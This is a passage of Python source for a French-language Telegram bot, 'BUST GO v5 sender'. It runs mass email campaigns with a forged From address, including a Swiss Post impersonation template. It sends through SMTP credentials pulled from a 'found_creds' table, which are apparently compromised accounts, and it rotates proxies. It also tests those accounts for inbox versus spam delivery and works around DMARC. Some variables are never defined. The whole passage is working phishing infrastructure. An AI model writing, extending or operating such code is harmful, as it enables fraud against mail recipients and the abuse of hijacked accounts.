        camp_data = ctx.user_data.get("camp_data", {})
        from .campaign_sender import CampaignManager, SmtpAccount
        mgr = CampaignManager(DB_PATH)
        camp_id = mgr.create_campaign(
            name=camp_data.get("subject", "Campaign")[:30],
            subject=camp_data.get("subject", ""),
            from_name=camp_data.get("from_name", ""),
            from_email=camp_data.get("from_email", ""),
            reply_to=camp_data.get("reply_to", ""),
            letter_html=camp_data.get("letter_html", ""),
            rate_per_minute=camp_data.get("rate", 30),
        )
        added = mgr.add_recipients(camp_id, emails)

        smtp_id = camp_data.get("smtp_id")
        if smtp_id == "all":
            smtp_count = mgr.add_all_valid_smtp(camp_id)
        elif smtp_id:
            smtp = _get_smtp_by_id(int(smtp_id))
            if smtp:
                mgr.add_smtp(camp_id, SmtpAccount(
                    cred_id=int(smtp_id),
                    host=smtp["smtp_host"],
                    port=smtp["smtp_port"] or 587,
                    username=smtp["smtp_user"] or "",
                    password=smtp["smtp_password"] or "",
                    from_email=camp_data.get("from_email", ""),
                    provider=smtp.get("provider", ""),
                ))
                smtp_count = 1
            else:
                smtp_count = 0
        else:
            smtp_count = mgr.add_all_valid_smtp(camp_id)

        mgr.close()
        ctx.user_data.pop("waiting", None)
        ctx.user_data.pop("camp_data", None)

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("LANCER MAINTENANT", callback_data=f"camp_start_{camp_id}")],
            [InlineKeyboardButton("VOIR DETAILS", callback_data=f"camp_view_{camp_id}")],
            [InlineKeyboardButton("Menu", callback_data="back_main")],
        ])

        return await update.effective_message.reply_text(
            f"=============================\n"
            f"  CAMPAGNE #{camp_id} CREEE\n"
            f"=============================\n\n"
            f"Sujet: {camp_data.get('subject', '?')}\n"
            f"From: {camp_data.get('from_name', '?')} <{camp_data.get('from_email', '?')}>\n"
            f"Reply-To: {camp_data.get('reply_to', 'aucun')}\n"
            f"Rate: {camp_data.get('rate', 30)}/min\n"
            f"Destinataires: {added}\n"
            f"SMTP: {smtp_count}\n\n"
            f"Le FROM est SPOOFE\n"
            f"Le destinataire voit: {camp_data.get('from_email', '?')}",
            reply_markup=kb,
        )


# ---------------------------------------------------------------------------
# Error handler — log all unhandled exceptions
# ---------------------------------------------------------------------------
async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE):
    import traceback
    print("SENDER BOT ERROR: %s" % ctx.error)
    traceback.print_exception(type(ctx.error), ctx.error, ctx.error.__traceback__)
    if update and hasattr(update, 'effective_message') and update.effective_message:
        try:
            await update.effective_message.reply_text("Erreur interne: %s" % str(ctx.error)[:200])
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Background spoof test — avoids Telegram handler timeout
# ---------------------------------------------------------------------------

async def _bg_tpl_spoof_test(bot, chat_id, smtp_config, tpl, to_email,
                              spoof_mode, dmarc_domain, dmarc_policy):
    """Background template spoof test — no proxy, direct connection."""
    from .campaign_sender import send_clean

    try:
        result = await asyncio.to_thread(
            send_clean,
            smtp_config,
            tpl["from_name"],
            tpl["from_email"],
            to_email,
            tpl["subject"],
            tpl["html"],
            tpl.get("reply_to", ""),
            None,
        )

        if result["success"]:
            mode_used = result.get("mode", "clean")
            dmarc_warn = ""
            if tld_stripped:
                dmarc_warn = (
                    f"\nDMARC p=reject → TLD auto-strippe\n"
                    f"From reel: {tpl['from_name']} <{actual_from}>"
                )
            elif dmarc_policy == "quarantine":
                dmarc_warn = "\nDMARC p=quarantine — le mail peut aller en SPAM."
            text = (
                "=============================\n"
                f"  {tpl['brand']} SPOOF — ENVOYE !\n"
                "=============================\n\n"
                f"Template: {tpl['brand']}\n"
                f"From: {tpl['from_name']} <{actual_from}>\n"
                f"To: {to_email}\n"
                f"Mode: {mode_used}\n"
                f"DMARC {dmarc_domain}: p={dmarc_policy}"
                f"{dmarc_warn}\n\n"
                "Verifie la boite mail !"
            )
        else:
            text = (
                f"{tpl['brand']} SPOOF — ECHEC\n\n"
                f"Erreur: {result.get('error', 'inconnue')}\n"
                f"SMTP: {smtp_config['host']}:{smtp_config['port']}\n"
                f"Mode: {result.get('spoof_mode_used', spoof_mode)}"
            )

        await bot.send_message(chat_id=chat_id, text=text[:4000])
    except Exception as e:
        try:
            await bot.send_message(chat_id=chat_id,
                text=f"TPL SPOOF — ERREUR\n{type(e).__name__}: {str(e)[:200]}")
        except Exception:
            pass


async def _bg_spoof_test(bot, chat_id, smtp_config, from_name, from_email,
                         to_email, subject, html_body, text_body, spoof_mode,
                         dmarc_domain, dmarc_policy, cred_id):
    """Background spoof test — no proxy, direct connection."""
    from .campaign_sender import send_clean

    try:
        html = html_body if "<" in html_body else "<p>" + html_body + "</p>"
        result = await asyncio.to_thread(
            send_clean,
            smtp_config,
            from_name,
            from_email,
            to_email,
            subject,
            html,
            from_email,
            None,
        )

        if result["success"]:
            mode_used = result.get("mode", "clean")
            dmarc_warn = ""
            if tld_stripped:
                dmarc_warn = (
                    f"\nDMARC p=reject → TLD auto-strippe\n"
                    f"From reel: {from_name} <{actual_from}>"
                )
            elif dmarc_policy == "quarantine":
                dmarc_warn = "\nDMARC p=quarantine — le mail peut aller en SPAM."
            text = (
                "=============================\n"
                "  SPOOF TEST — ENVOYE !\n"
                "=============================\n\n"
                f"From: {from_name} <{actual_from}>\n"
                f"To: {to_email}\n"
                f"Sujet: {subject}\n"
                f"Mode: {mode_used}\n"
                f"DMARC {dmarc_domain}: p={dmarc_policy}"
                f"{dmarc_warn}\n\n"
                "Verifie la boite mail !"
            )
        else:
            text = (
                f"SPOOF TEST — ECHEC\n\n"
                f"Erreur: {result.get('error', 'inconnue')}\n"
                f"SMTP: {smtp_config['host']}:{smtp_config['port']}\n"
                f"Mode: {result.get('spoof_mode_used', spoof_mode)}"
            )

        await bot.send_message(chat_id=chat_id, text=text[:4000])
    except Exception as e:
        try:
            await bot.send_message(chat_id=chat_id,
                text=f"SPOOF TEST — ERREUR\n{type(e).__name__}: {str(e)[:200]}")
        except Exception:
            pass




# ---------------------------------------------------------------------------
# Swiss Post Campaign Runner with basique fallback + SMTP retry
# ---------------------------------------------------------------------------
_CAMPAIGN_ACTIVE = False

async def _run_swisspost_campaign(campaign_id, db_path, chat_id, mode="spoof"):
    """
    Swiss Post campaign — MULTI-WORKER version.
    Uses ThreadPoolExecutor with concurrent workers for parallel sending.
    Scales with available CPU cores and SMTP count.
    """
    from .campaign_sender import CampaignManager, send_clean
    from .spoof_templates import get_template
    from .proxy_pool import ProxyPool
    from .db import send_telegram
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import threading

    mgr = CampaignManager(db_path)
    camp = mgr.get_campaign(campaign_id)
    if not camp:
        mgr.close()
        return

    smtp_list = mgr.get_smtp_for_campaign(campaign_id)
    if not smtp_list:
        send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP", chat_id)
        mgr.close()
        return

    # Filter SMTPs based on mode
    if mode == "inbox":
        import sqlite3 as _sql
        _db = _sql.connect(db_path, timeout=120)
        _db.row_factory = _sql.Row
        _db.execute("PRAGMA journal_mode=WAL")
        _db.execute("PRAGMA busy_timeout=300000")
        _spoof_inbox_ids = set()
        for row in _db.execute("SELECT id, context FROM found_creds WHERE auth_ok=1").fetchall():
            ctx = row["context"] or ""
            if "SPOOF_INBOX_" in ctx:
                _spoof_inbox_ids.add(row["id"])
        _db.close()
        non_inbox = [s for s in smtp_list if s["cred_id"] not in _spoof_inbox_ids]
        for s in non_inbox:
            mgr.deactivate_smtp(s["id"], "not_spoof_inbox")
        smtp_list = [s for s in smtp_list if s["cred_id"] in _spoof_inbox_ids]
        if not smtp_list:
            send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP SPOOF INBOX", chat_id)
            mgr.close()
            return
        inbox_names = ", ".join(s["host"] for s in smtp_list)
        send_telegram("SPOOF INBOX: " + str(len(smtp_list)) + " SMTP (" + inbox_names + ")", chat_id)

    mgr.update_campaign_status(campaign_id, "running")

    global _CAMPAIGN_ACTIVE
    _CAMPAIGN_ACTIVE = True

    # Reset orphan sending from previous crash
    try:
        rc = mgr.reset_orphan_sending(campaign_id)
        if rc:
            print(f"[CAMP] Reset {rc} orphan sending -> pending", flush=True)
    except Exception:
        pass

    rate = camp["rate_per_minute"] or 30
    # Scale workers: min(SMTP count * 2, 100) — exploit 4 cores
    num_workers = min(len(smtp_list), 44)
    # Delay per worker batch to respect overall rate
    batch_delay = max(0.3, 60.0 / rate)

    proxy_pool = ProxyPool(db_path)
    proxy_count = proxy_pool.count_active()

    # Thread-safe counters + smart SMTP protection
    lock = threading.Lock()
    smtp_health = {}  # per-SMTP: {sent, fails, cooldown_until, daily_sent, last_success}
    for s in smtp_list:
        smtp_health[s["id"]] = {
            "sent": 0, "fails": 0, "cooldown_until": 0.0,
            "daily_sent": 0, "last_success": 0.0, "consecutive_fails": 0,
        }
    COOLDOWN_BASE = 5            # Seconds cooldown after error (doubles each time)
    COOLDOWN_MAX = 30            # Max cooldown seconds
    AUTH_FAIL_DEAD = True        # AUTH fail = permanently dead

    stats = {
        "sent": 0, "failed": 0, "spoof_ok": 0, "basique_ok": 0,
        "dead_smtps": set(), "basique_smtps": set(),
    }
    start_time = time.time()

    send_telegram(
        "CAMP SWISS POST #" + str(campaign_id) + " LANCEE\n"
        "Mode: " + mode + " | Rate: " + str(rate) + "/min\n"
        "SMTP: " + str(len(smtp_list)) + " | Workers: " + str(num_workers) + "\n"
        "Recipients: " + str(camp["total_recipients"]) + "\n"
        "Proxies: " + str(proxy_count) + " (fallback direct)",
        chat_id)

    def _get_recipient_provider(email):
        """Detect if recipient is Gmail or Outlook/Hotmail."""
        domain = email.split("@")[1].lower() if "@" in email else ""
        if domain in ("gmail.com", "googlemail.com"):
            return "gmail"
        elif domain in ("hotmail.com", "hotmail.fr", "hotmail.co.uk", "hotmail.de",
                        "outlook.com", "outlook.fr", "outlook.de",
                        "live.com", "live.fr", "live.co.uk", "live.de",
                        "msn.com"):
            return "outlook"
        return "other"

    def _get_smtp_provider_affinity(cred_id):
        """Get which email providers this SMTP is good for based on its context label."""
        import sqlite3 as _sql2
        try:
            _db2 = _sql2.connect(db_path, timeout=120)
            _db2.execute("PRAGMA journal_mode=WAL")
            _db2.execute("PRAGMA busy_timeout=300000")
            row = _db2.execute("SELECT context FROM found_creds WHERE id=?", (cred_id,)).fetchone()
            _db2.close()
            if row:
                ctx = row[0] or ""
                affinities = set()
                if "INBOX_BOTH" in ctx:
                    affinities.update(["gmail", "outlook"])
                if "INBOX_GMAIL" in ctx or "INBOX" in ctx:
                    affinities.add("gmail")
                if "INBOX_OUTLOOK" in ctx:
                    affinities.add("outlook")
                return affinities
        except Exception:
            pass
        return set()

    # Cache smtp affinities to avoid DB hits per recipient
    _smtp_affinity_cache = {}
    for s in smtp_list:
        _smtp_affinity_cache[s["id"]] = _get_smtp_provider_affinity(s["cred_id"])

    def _pick_best_smtp(all_smtp, recipient_provider="other"):
        """Pick SMTP with best affinity + randomization among equal scores + pre-reserve."""
        import random as _rnd
        now = time.time()
        perfect = []
        fallback = []
        with lock:
            for s in all_smtp:
                sid = s["id"]
                if sid in stats["dead_smtps"]:
                    continue
                h = smtp_health.get(sid, {})
                if h.get("cooldown_until", 0) > now:
                    continue
                score = h.get("sent", 0) * 2 + h.get("fails", 0) * 5
                affinity = _smtp_affinity_cache.get(sid, set())
                if recipient_provider in affinity:
                    perfect.append((score, s))
                fallback.append((score, s))
        candidates = perfect if perfect else fallback
        if not candidates:
            return None
        # Randomize among equal-score candidates
        min_score = min(c[0] for c in candidates)
        best = [c[1] for c in candidates if c[0] == min_score]
        pick = _rnd.choice(best)
        # Pre-reserve: increment sent so parallel workers pick different SMTP
        with lock:
            sid = pick["id"]
            h = smtp_health.get(sid, {})
            h["sent"] = h.get("sent", 0) + 1
            smtp_health[sid] = h
        return pick

    def _smtp_cooldown(smtp_id):
        """Put SMTP in exponential cooldown."""
        with lock:
            h = smtp_health.get(smtp_id, {})
            cf = h.get("consecutive_fails", 0) + 1
            h["consecutive_fails"] = cf
            h["fails"] = h.get("fails", 0) + 1
            # Exponential backoff: 10s, 20s, 40s, 80s, 120s max
            cooldown = min(COOLDOWN_BASE * (2 ** (cf - 1)), COOLDOWN_MAX)
            h["cooldown_until"] = time.time() + cooldown
            smtp_health[smtp_id] = h

    def _smtp_success(smtp_id):
        """Record success — reset consecutive fails, update counters."""
        with lock:
            h = smtp_health.get(smtp_id, {})
            h["sent"] = h.get("sent", 0) + 1
            h["daily_sent"] = h.get("daily_sent", 0) + 1
            h["consecutive_fails"] = 0
            h["cooldown_until"] = 0.0
            h["last_success"] = time.time()
            smtp_health[smtp_id] = h

    def _send_one_recipient(recipient, all_smtp, start_idx):
        """Send one email — smart SMTP selection with cooldown + daily limits."""
        to_email = recipient["email"]
        rcpt_prov = _get_recipient_provider(to_email)
        html_body = camp["letter_html"].replace("{{RECIPIENT_EMAIL}}", to_email)
        from_name = camp["from_name"]
        from_email = camp["from_email"]
        last_err = ""

        # Try all SMTPs — if all in cooldown, WAIT until one is ready
        tried = set()
        for attempt in range(len(all_smtp)):
            # Pick best available SMTP (exclude already tried this round)
            smtp = _pick_best_smtp([s for s in all_smtp if s["id"] not in tried], rcpt_prov)
            if not smtp:
                # All tried or in cooldown — wait for cooldown to expire
                tried.clear()  # Reset tried list for next round
                for wait_attempt in range(5):  # Wait up to 15s
                    time.sleep(3)
                    smtp = _pick_best_smtp(all_smtp, rcpt_prov)
                    if smtp:
                        break
                if not smtp:
                    break  # 60s and still nothing = truly dead
            tried.add(smtp["id"])

            with lock:
                use_basique = smtp["id"] in stats["basique_smtps"]

            smtp_config = {
                "host": smtp["host"], "port": smtp["port"],
                "username": smtp["username"], "password": smtp["password"],
                "from_email": smtp.get("from_email", "") or smtp["username"],
            }

            if use_basique:
                domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
                send_from = "swisspost@" + domain
            else:
                send_from = from_email

            # Try send (direct, no proxy for now)
            proxy = proxy_pool.get_next() if proxy_count > 0 else None
            r = send_clean(smtp_config, from_name, send_from, to_email,
                           camp["subject"], html_body, camp.get("reply_to", ""), proxy)

            if not r["success"] and proxy is not None:
                r = send_clean(smtp_config, from_name, send_from, to_email,
                               camp["subject"], html_body, camp.get("reply_to", ""), None)

            if r["success"]:
                _smtp_success(smtp["id"])
                return {"ok": True, "mode": "basique" if use_basique else "spoof",
                        "recipient_id": recipient["id"], "smtp": smtp}

            last_err = r.get("error", "?")

            # AUTH fail or SENDER_550 = dead forever (permanent rejection)
            if "AUTH" in last_err or "SENDER_550" in last_err:
                with lock:
                    stats["dead_smtps"].add(smtp["id"])
                    smtp_health[smtp["id"]]["consecutive_fails"] = 999
                continue

            # Other errors = cooldown (not dead)
            _smtp_cooldown(smtp["id"])

            # If spoof failed and mode=both, try basique
            if not use_basique and mode == "both":
                domain = smtp["username"].split("@")[1] if "@" in smtp["username"] else smtp["host"]
                bas_from = "swisspost@" + domain
                r2 = send_clean(smtp_config, from_name, bas_from, to_email,
                                camp["subject"], html_body, camp.get("reply_to", ""), None)
                if r2["success"]:
                    _smtp_success(smtp["id"])
                    with lock:
                        stats["basique_smtps"].add(smtp["id"])
                    return {"ok": True, "mode": "basique",
                            "recipient_id": recipient["id"], "smtp": smtp}

        # All SMTPs failed for this recipient
        return {"ok": False, "error": last_err, "recipient_id": recipient["id"], "smtp": None}

    # Main send loop — claim batches, submit to executor
    executor = ThreadPoolExecutor(max_workers=num_workers, thread_name_prefix="campsp")

    try:
        while True:
            # Claim a batch of recipients — with robust error handling
            batch = []
            db_retries = 0
            for _ in range(num_workers):
                try:
                    r = mgr.claim_recipient(campaign_id)
                    if not r:
                        break
                    batch.append(r)
                    db_retries = 0  # Reset on success
                except Exception as _db_err:
                    if "locked" in str(_db_err).lower() and db_retries < 10:
                        db_retries += 1
                        print(f"[CAMP] DB locked on claim, retry {db_retries}...", flush=True)
                        await asyncio.sleep(2)
                        continue
                    else:
                        print(f"[CAMP] claim_recipient error: {_db_err}", flush=True)
                        break

            if not batch:
                try:
                    stats_check = mgr.get_stats(campaign_id)
                    if stats_check.pending == 0:
                        break
                    print(f"[CAMP] No batch but {stats_check.pending} pending — reconnecting DB, waiting 10s...", flush=True)
                    try:
                        mgr.close()
                    except Exception:
                        pass
                    mgr = CampaignManager(db_path)
                    await asyncio.sleep(10)
                    continue
                except Exception:
                    try:
                        mgr.close()
                    except Exception:
                        pass
                    mgr = CampaignManager(db_path)
                    await asyncio.sleep(10)
                    continue

            # Get active SMTPs
            with lock:
                active_smtp = [s for s in mgr.get_smtp_for_campaign(campaign_id)
                               if s["id"] not in stats["dead_smtps"]]

            if not active_smtp:
                # All SMTP dead — put batch back as pending and stop
                send_telegram("CAMP #" + str(campaign_id) + ": TOUS SMTP AUTH DEAD — arret", chat_id)
                for r in batch:
                    # Reset to pending so they can be retried later
                    mgr.db.execute("UPDATE campaign_recipients SET status='pending' WHERE id=?", (r["id"],))
                mgr.db.commit()
                break

            # Submit batch to thread pool — each worker tries ALL SMTPs
            futures = {}
            for i, recipient in enumerate(batch):
                start_idx = (i + stats["sent"] + stats["failed"]) % len(active_smtp)
                f = executor.submit(_send_one_recipient, recipient, active_smtp, start_idx)
                futures[f] = recipient

            # Collect results — with timeout to prevent infinite block
            _timed_out = False
            try:
              for f in as_completed(futures, timeout=90):
                try:
                    result = f.result(timeout=5)
                except Exception as e:
                    result = {"ok": False, "error": str(e)[:80],
                              "recipient_id": futures[f]["id"], "smtp": None}

                with lock:
                    if result["ok"]:
                        info = result["smtp"]["host"] + " [" + result["mode"] + "]"
                        for _db_r in range(5):
                            try:
                                mgr.mark_sent(result["recipient_id"], info)
                                if result["smtp"]:
                                    mgr.increment_smtp_daily(result["smtp"]["id"])
                                break
                            except Exception as _e:
                                if _db_r < 4:
                                    time.sleep(0.5 * (2 ** _db_r))
                                else:
                                    print(f"[CAMP] mark_sent failed: {_e}", flush=True)
                        stats["sent"] += 1
                        if result["mode"] == "basique":
                            stats["basique_ok"] += 1
                        else:
                            stats["spoof_ok"] += 1
                    else:
                        err = result.get("error", "?")
                        for _db_r in range(5):
                            try:
                                mgr.mark_failed(result["recipient_id"], err, "all_smtp_tried")
                                break
                            except Exception as _e:
                                if _db_r < 4:
                                    time.sleep(0.5 * (2 ** _db_r))
                                else:
                                    print(f"[CAMP] mark_failed failed: {_e}", flush=True)
                        stats["failed"] += 1

            except TimeoutError:
                print("[CAMP] Batch timeout 90s — killing thread pool + resetting recipients", flush=True)
                for f in futures:
                    if not f.done():
                        f.cancel()
                        r = futures[f]
                        try:
                            mgr.db.execute("UPDATE campaign_recipients SET status='pending' WHERE id=?", (r["id"],))
                        except Exception:
                            pass
                try:
                    mgr.db.commit()
                except Exception:
                    pass
                # KILL old thread pool and create fresh one
                try:
                    executor.shutdown(wait=False, cancel_futures=True)
                except Exception:
                    pass
                executor = ThreadPoolExecutor(max_workers=num_workers, thread_name_prefix="campsp")
                # Reset all cooldowns so threads can retry fresh
                with lock:
                    for sid in smtp_health:
                        smtp_health[sid]["cooldown_until"] = 0
                        smtp_health[sid]["consecutive_fails"] = 0
                await asyncio.sleep(5)

            # Progress every 50 sends (with SMTP health)
            with lock:
                total_done = stats["sent"] + stats["failed"]
            if total_done % 50 < num_workers and total_done > 0:
                elapsed = time.time() - start_time
                rpm = stats["sent"] / (elapsed / 60) if elapsed > 0 else 0
                with lock:
                    now_t = time.time()
                    alive = sum(1 for s in active_smtp
                                if s["id"] not in stats["dead_smtps"]
                                and smtp_health.get(s["id"], {}).get("cooldown_until", 0) <= now_t)
                    cooling = sum(1 for s in active_smtp
                                  if s["id"] not in stats["dead_smtps"]
                                  and smtp_health.get(s["id"], {}).get("cooldown_until", 0) > now_t)
                send_telegram(
                    "CAMP SP #" + str(campaign_id) + "\n"
                    "Sent: " + str(stats["sent"]) + " (spoof:" + str(stats["spoof_ok"]) + " bas:" + str(stats["basique_ok"]) + ")\n"
                    "Failed: " + str(stats["failed"]) + " | " + str(int(rpm)) + "/min\n"
                    "SMTP alive: " + str(alive) + " | cooling: " + str(cooling) + " | dead: " + str(len(stats["dead_smtps"])), chat_id)

            # Rate limiting between batches
            await asyncio.sleep(batch_delay)

    except Exception as _fatal:
        print(f"[CAMP] FATAL ERROR in campaign #{campaign_id}: {_fatal}", flush=True)
        import traceback
        traceback.print_exc()
        try:
            send_telegram("CAMP #" + str(campaign_id) + " ERREUR FATALE: " + str(_fatal)[:200], chat_id)
        except Exception:
            pass
    finally:
        try:
            executor.shutdown(wait=False)
        except Exception:
            pass
        _CAMPAIGN_ACTIVE = False

    try:
        status = "finished" if not mgr.claim_recipient(campaign_id) else "stopped"
    except Exception:
        status = "stopped"
    try:
        mgr.update_campaign_status(campaign_id, status)
    except Exception:
        pass
    elapsed = time.time() - start_time
    final_stats = mgr.get_stats(campaign_id)
    rpm_final = stats["sent"] / (elapsed / 60) if elapsed > 0 else 0
    send_telegram(
        "=============================\n"
        "  SWISS POST #" + str(campaign_id) + " " + status.upper() + "\n"
        "=============================\n"
        "Sent: " + str(final_stats.sent) + " (spoof:" + str(stats["spoof_ok"]) + " bas:" + str(stats["basique_ok"]) + ")\n"
        "Failed: " + str(final_stats.failed) + "\n"
        "Pending: " + str(final_stats.pending) + "\n"
        "SMTP dead: " + str(len(stats["dead_smtps"])) + "\n"
        "Speed: " + str(int(rpm_final)) + "/min\n"
        "Workers: " + str(num_workers) + "\n"
        "Time: " + str(int(elapsed)) + "s", chat_id)
    mgr.close()
    proxy_pool.close()



# ---------------------------------------------------------------------------
# Auto SMTP Health Check (runs every hour)
# ---------------------------------------------------------------------------
_health_check_task = None

async def _smtp_health_check_loop():
    """Every 3h: send FRESH spoof from each SMTP, check IMAP inbox/spam, update labels, kill deads."""
    import sqlite3 as _sql, uuid as _uuid, imaplib, ssl as _ssl
    while True:
        await asyncio.sleep(10800)  # 3 hours
        try:
            if _CAMPAIGN_ACTIVE:
                print("[IMAP CHECK] SKIPPED — campaign is active", flush=True)
                continue
            print("[IMAP CHECK] Starting fresh delivery classification...", flush=True)
            from .campaign_sender import send_clean
            from .spoof_templates import get_template
            from .imap_checker import GMAIL_CHECKER, is_gmail_checker_configured
            from .db import send_telegram as _notify
            import smtplib

            if not is_gmail_checker_configured():
                print("[IMAP CHECK] Gmail checker not configured, skip", flush=True)
                continue

            tpl = get_template("swisspost")
            if not tpl:
                continue

            checker_email = GMAIL_CHECKER["email"]
            db = _sql.connect(DB_PATH, timeout=120)
            db.row_factory = _sql.Row
            db.execute("PRAGMA journal_mode=WAL")
            db.execute("PRAGMA busy_timeout=300000")
            rows = db.execute(
                "SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1"
            ).fetchall()
            if not rows:
                db.close()
                continue

            run_id = "HC-" + _uuid.uuid4().hex[:6]
            markers = {}  # sid -> {host, marker}
            dead_ids = []

            # Phase 1: AUTH check + send fresh spoof (NON-BLOCKING)
            def _hc_test_one(sid, host, port, user, pwd, run_id, tpl_data, checker_email, old_ctx):
                """Blocking AUTH + send — runs in thread to avoid freezing event loop."""
                import smtplib as _smtp2
                res = {"sid": sid, "host": host, "dead": False, "skip": False, "marker": None, "old_ctx": old_ctx}
                try:
                    _ctx = _ssl.create_default_context()
                    _ctx.check_hostname = False
                    _ctx.verify_mode = _ssl.CERT_NONE
                    if port == 465:
                        srv = _smtp2.SMTP_SSL(host, port, timeout=8, context=_ctx)
                    else:
                        srv = _smtp2.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=_ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    srv.quit()
                except _smtp2.SMTPAuthenticationError:
                    res["dead"] = True
                    return res
                except Exception:
                    res["skip"] = True
                    return res
                marker = f"{run_id}-{sid}"
                smtp_config = {"host": host, "port": port, "username": user, "password": pwd, "from_email": user}
                r = send_clean(smtp_config, tpl_data["from_name"], tpl_data["from_email"], checker_email, f"{tpl_data['subject']} [{marker}]", tpl_data["html"], tpl_data.get("reply_to", ""), None)
                if r["success"]:
                    res["marker"] = marker
                elif "SENDER_550" in r.get("error", ""):
                    res["spoof_dead"] = True
                return res

            tpl_data = {"from_name": tpl["from_name"], "from_email": tpl["from_email"], "subject": tpl["subject"], "html": tpl["html"], "reply_to": tpl.get("reply_to", "")}
            for r in rows:
                if _CAMPAIGN_ACTIVE:
                    print("[IMAP CHECK] Campaign started — aborting", flush=True)
                    break
                sid = r["id"]
                host, port = r["smtp_host"], r["smtp_port"]
                user, pwd = r["smtp_user"], r["smtp_password"]
                hc_res = await asyncio.to_thread(_hc_test_one, sid, host, port, user, pwd, run_id, tpl_data, checker_email, r["context"] or "")
                if hc_res["dead"]:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead_ids.append(sid)
                    print(f"[IMAP CHECK] #{sid} {host} AUTH DEAD", flush=True)
                    continue
                if hc_res["skip"]:
                    continue
                if hc_res.get("spoof_dead"):
                    # SMTP can auth but rejects spoofed From (SENDER_550) - reclassify
                    old_ctx = r["context"] or ""
                    if "SPOOF_INBOX" in old_ctx or "SPOOF_SPAM" in old_ctx:
                        new_ctx = old_ctx.replace("SPOOF_INBOX", "SPOOF_DEAD").replace("SPOOF_SPAM", "SPOOF_DEAD")
                        db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))
                        print(f"[IMAP CHECK] #{sid} {host} SPOOF DEAD (SENDER_550)", flush=True)
                    continue
                if hc_res["marker"]:
                    markers[sid] = {"host": host, "marker": hc_res["marker"], "old_ctx": hc_res["old_ctx"]}
                await asyncio.sleep(0.3)

            # COMMIT dead auth updates and CLOSE DB before long wait
            db.commit()
            db.close()
            db = None

            # Phase 2: Wait 90s for delivery
            print(f"[IMAP CHECK] {len(markers)} sent, {len(dead_ids)} dead, waiting 90s...", flush=True)
            await asyncio.sleep(90)

            # Phase 3: Check IMAP with 3 retries
            for attempt in range(3):
                try:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    imap = imaplib.IMAP4_SSL("imap.gmail.com", 993, ssl_context=ctx, timeout=20)
                    imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])

                    for sid, info in markers.items():
                        if "result" in info:
                            continue
                        search_q = f'SUBJECT "{info["marker"]}"'

                        imap.select("INBOX", readonly=True)
                        st, ids = imap.search(None, search_q)
                        if st == "OK" and ids[0] and ids[0].strip():
                            info["result"] = "INBOX"
                            continue

                        imap.select("[Gmail]/Spam", readonly=True)
                        st, ids = imap.search(None, search_q)
                        if st == "OK" and ids[0] and ids[0].strip():
                            info["result"] = "SPAM"
                            continue

                    imap.logout()
                except Exception as e:
                    print(f"[IMAP CHECK] IMAP error attempt {attempt+1}: {e}", flush=True)

                remaining = [s for s, i in markers.items() if "result" not in i]
                if not remaining:
                    break
                if attempt < 2:
                    await asyncio.sleep(15)

            # Phase 4: Reopen DB for quick updates — commit after each one
            db = _sql.connect(DB_PATH, timeout=120)
            db.execute("PRAGMA journal_mode=WAL")
            db.execute("PRAGMA busy_timeout=300000")
            si = ss = nf = 0
            for sid, info in markers.items():
                result = info.get("result", "NOT_FOUND")
                old_ctx = info["old_ctx"]

                # Extract label suffix
                label = old_ctx.replace("Manual: ", "")
                for pfx in ["SPOOF_INBOX_", "SPOOF_SPAM_", "BASIQUE_INBOX_", "BASIQUE_SPAM_", "SPOOF_", "BASIQUE_", "STRIP_"]:
                    if label.startswith(pfx):
                        label = label[len(pfx):]
                        break

                if result == "INBOX":
                    new_ctx = f"Manual: SPOOF_INBOX_{label}"
                    si += 1
                elif result == "SPAM":
                    new_ctx = f"Manual: SPOOF_SPAM_{label}"
                    ss += 1
                else:
                    nf += 1
                    continue  # Keep old label if not found

                try:
                    db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))
                    db.commit()  # Commit EACH update to release lock quickly
                except Exception:
                    pass

            db.close()

            summary = (
                f"IMAP CHECK AUTO ({run_id})\n"
                f"SMTP: {len(rows)} | Dead: {len(dead_ids)}\n"
                f"SPOOF INBOX: {si}\n"
                f"SPOOF SPAM: {ss}\n"
                f"Not found: {nf}"
            )
            print(f"[IMAP CHECK] SI:{si} SS:{ss} NF:{nf} DEAD:{len(dead_ids)}", flush=True)
            _notify(summary)

        except Exception as e:
            print(f"[IMAP CHECK] Error: {e}", flush=True)


def run_sender():
    token = BOT_TOKEN
    if not token:
        raise RuntimeError("SENDER_BOT_TOKEN manquant")
    if not ADMIN_IDS:
        raise RuntimeError("SENDER_ADMIN_IDS manquant")
    
    print(f"BUST GO v5 // SENDER BOT")
    print(f"  Admins: {ADMIN_IDS}")
    print(f"  DB: {DB_PATH}")
    
    # Fix Python 3.14: asyncio.get_event_loop() no longer auto-creates a loop
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())
    
    from telegram.request import HTTPXRequest
    request = HTTPXRequest(
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=10.0,
    )
    app = Application.builder().token(token).request(request).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, messages))
    app.add_error_handler(error_handler)
    async def _post_init(application):
        global _health_check_task
        _health_check_task = asyncio.create_task(_smtp_health_check_loop())
        print('  IMAP delivery check: ON (every 3h)', flush=True)
        # Auto-resume ONLY the latest running campaign (avoid resource conflicts)
        try:
            from .campaign_sender import CampaignManager
